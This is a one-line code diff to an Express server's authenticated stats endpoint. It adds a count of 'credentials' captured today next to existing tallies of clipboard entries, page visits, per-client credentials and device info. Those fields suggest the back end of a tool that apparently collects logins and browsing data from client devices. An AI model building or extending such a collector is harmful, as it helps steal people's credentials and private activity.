@@ -942,6 +942,7 @@ app.get('/api/stats', requireAuth, (req, res) => {
         clipboardCount: store.clipboard.length,
         visitCount: store.pageVisits.length,
         credentialCount: (store.credentials || []).length,
+        credentialCountToday: (store.credentials || []).filter(c => new Date(c.timestamp).getTime() >= todayStart.getTime()).length,
         credentialClients: [...new Set((store.credentials || []).map(c => c.clientId))],
         deviceInfo: store.deviceInfo,
         tags: store.tags || {},
